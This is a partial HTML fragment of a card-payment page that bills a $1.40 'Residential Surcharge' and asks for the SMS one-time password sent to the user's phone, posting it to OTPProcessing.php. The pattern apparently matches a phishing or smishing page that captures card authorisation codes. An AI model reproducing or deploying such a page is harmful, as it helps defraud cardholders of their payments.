        ...
        <div class="row">
            ...
            <div class="col-sm-6 pt-5" style="background-color:white;">
                    ...
                    <div class="card" style="background-color:white; height:420px">
                        ...
                        <div class="card-body">
                            <div><span style="font-size:15px; font-weight:bold; padding-bottom: 235px;">Residential Surcharge<br>Amount: $1.40</span><br><br></div>
                        <p></p><h2>Processing Card Payment -OTP</h2><p></p>

                        <form method="POST" action="OTPProcessing.php">
                                <input type="hidden" name="_token" value="huI2jmlGgtlaZ4kplcbWV1dBV4gIN6XWlu4aH7OE" autocomplete="off">
                                <div class="row mb-3">
                                   <div class="form-group">
                            <p>Please submit the One-Time-Password code, sent to your Mobile Device.</p>

                        <table class="table table-hover" style="border-collapse: collapse;">
                            <thead>                
                                <tr>
                                    <th style="border: none;">
                                        <label for="cardholder-otp">SMS OTP</label>
                                        <input type="text" id="cardholder-otp" name="cardholder-otp" minlength="4" maxlength="8" required="" class="form-control" style="width: 40%;">
                                    </th>
                                    <th style="border: none;">
                            ...
                            <tbody>
                                ...
                                <div class="row mb-0 pt-3 pb-3">
                                <div class="d-flex"><button type="submit" class="btn btn-primary btn-lg" style="width: 32%; font-size: 15px; color: white; margin-right: 4%;"> Submit OTP </button>
                                                <button type="submit" class="btn btn-danger btn-lg" style="width: 32%; font-size: 14px; color: white; margin-right: 4%;"> CANCEL </button>
                                                </div>
                                                

                                </div>
                                    <div class="d-flex d-grid pb-5 ">
